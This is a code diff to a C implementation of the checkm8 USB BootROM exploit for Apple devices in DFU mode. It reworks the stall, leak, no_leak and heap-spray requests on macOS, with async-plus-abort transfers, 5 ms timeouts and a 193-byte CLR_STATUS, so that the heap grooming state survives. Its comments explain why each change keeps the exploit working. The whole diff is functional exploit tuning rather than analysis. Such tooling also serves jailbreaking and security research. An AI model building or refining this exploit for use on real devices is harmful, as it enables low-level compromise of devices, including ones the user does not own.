@@ -39,8 +39,15 @@ int checkm8_usb_request_stall(libusb_device_handle *usb)
 
     log_debug("request_stall: SET_FEATURE(ENDPOINT_HALT) bmReqType=0x02 "
               "bReq=0x03 wIdx=0x80");
+    /*
+     * gaster uses its 5 ms usb_timeout for this request too.  A SET_FEATURE
+     * that stalls does so immediately, so the short budget costs nothing
+     * when it works -- and when it does not, it returns control before the
+     * controller escalates to kIOReturnNotResponding and kills the
+     * IOService (which is what a multi-second pending request does).
+     */
     ret = usb_ctrl_transfer_no_data_raw(usb, 0x02, 0x03, 0, 0x80,
-                                        USB_TIMEOUT_MS);
+                                        GASTER_USB_TIMEOUT_MS);
 
     if (ret == LIBUSB_ERROR_PIPE) {
         log_debug("request_stall: STALL received (success)");
@@ -72,6 +79,23 @@ int checkm8_usb_request_leak(libusb_device_handle *usb, uint8_t iserial_idx)
 
     log_debug("request_leak: GET_DESCRIPTOR string idx=%u len=%u timeout=%ums",
               iserial_idx, EP0_MAX_PACKET_SZ, STALL_TIMEOUT_MS);
+#if defined(__APPLE__)
+    /*
+     * E5: gaster-faithful transport.  Submit ASYNC, sleep 1 ms while
+     * the GET_DESCRIPTOR is still pending on the device, then abort
+     * pipe zero.  The abort snaps the device out of the hung request
+     * IN FLIGHT -- an abort after a synchronous timeout is too late:
+     * the device-side request stays pending until the USB stack wedges
+     * (0xe00002ed) and the device re-enumerates, destroying the whole
+     * stage-2/3 heap state.
+     */
+    if (iokit_usb_is_active()) {
+        ret = iokit_usb_ctrl_transfer_async_abort(
+                  0x80, 0x06, (uint16_t)((3U << 8U) | iserial_idx),
+                  USB_MAX_STRING_DESC_IDX, buf, EP0_MAX_PACKET_SZ,
+                  GASTER_USB_TIMEOUT_MS, STALL_TIMEOUT_MS);
+    } else
+#endif
     ret = usb_ctrl_transfer_async_ret(usb, 0x80, 0x06,
                                       (uint16_t)((3U << 8U) | iserial_idx),
                                       USB_MAX_STRING_DESC_IDX,
@@ -163,6 +187,15 @@ int checkm8_no_leak(libusb_device_handle *usb, uint8_t iserial_idx)
 
     log_debug("no_leak: GET_DESCRIPTOR len=%u (odd size for hole creation)",
               desc_len);
+#if defined(__APPLE__)
+    /* Same gaster async+abort transport as the leak (see above). */
+    if (iokit_usb_is_active()) {
+        ret = iokit_usb_ctrl_transfer_async_abort(
+                  0x80, 0x06, (uint16_t)((3U << 8U) | iserial_idx),
+                  USB_MAX_STRING_DESC_IDX, buf, desc_len,
+                  GASTER_USB_TIMEOUT_MS, STALL_TIMEOUT_MS);
+    } else
+#endif
     ret = usb_ctrl_transfer_async_ret(usb, 0x80, 0x06,
                                       (uint16_t)((3U << 8U) | iserial_idx),
                                       USB_MAX_STRING_DESC_IDX,
@@ -274,24 +307,32 @@ int checkm8_stage_spray(dfu_ctx_t *ctx)
         if (!ctx->skip_clrstatus) {
 #if defined(__APPLE__)
             if (iokit_usb_is_active()) {
-                /* IOKit path: zero-length CLR_STATUS only.
+                /*
+                 * gaster: after the stall/leak/no_leak loop, ONE
+                 * synchronous CLR_STATUS with wLength = 3*64+1 = 193
+                 * and a real 193-byte zero buffer, 5 ms timeout, result
+                 * IGNORED (send_usb_control_request never fails).
                  *
-                 * The oversized (193-byte) variant sends wLength=193
-                 * but the BootROM's CLRSTATUS handler expects wLength=0.
-                 * On Apple Silicon XHCI, DeviceRequestTO hangs on the
-                 * unacknowledged DATA phase → kIOReturnNotResponding
-                 * (0xe00002ed), which permanently poisons the IOKit
-                 * handle for all subsequent transfers.
-                 *
-                 * The heap grooming from the extra allocation is not
-                 * critical for path A — stall+leak+no_leak already
-                 * shaped the heap.  State transition is all we need. */
-                int clr_ret = usb_ctrl_transfer_no_data_raw(usb, 0x21,
-                                      DFU_REQ_CLRSTATUS,
-                                      0, 0, USB_TIMEOUT_MS);
-                log_debug("checkm8_stage_spray: CLR_STATUS (zero-len, IOKit) "
-                          "ret=%d (%s)", clr_ret,
-                          clr_ret < 0 ? libusb_strerror(clr_ret) : "ok");
+                 * No GETSTATE probe before it, no AbortPipeZero: the
+                 * async spray leaves the device in a state where the
+                 * next synchronous request races the just-aborted
+                 * no_leak; probing first just changes which request
+                 * eats the wedge.  If the device wedges here anyway
+                 * (0xe00002ed), that is information -- keep the spray
+                 * itself clean and observe.
+                 */
+                uint16_t clr_len = 3 * EP0_MAX_PACKET_SZ + 1;
+                uint8_t *clr_buf = calloc(1, clr_len);
+                if (clr_buf) {
+                    int clr_ret = iokit_usb_ctrl_transfer(
+                                      0x21, DFU_REQ_CLRSTATUS, 0, 0,
+                                      clr_buf, clr_len,
+                                      GASTER_USB_TIMEOUT_MS);
+                    log_info("checkm8_stage_spray: CLR_STATUS (%u bytes, "
+                             "gaster) ret=%d%s", clr_len, clr_ret,
+                             clr_ret < 0 ? " (ignored)" : "");
+                    free(clr_buf);
+                }
             } else
 #endif
             {
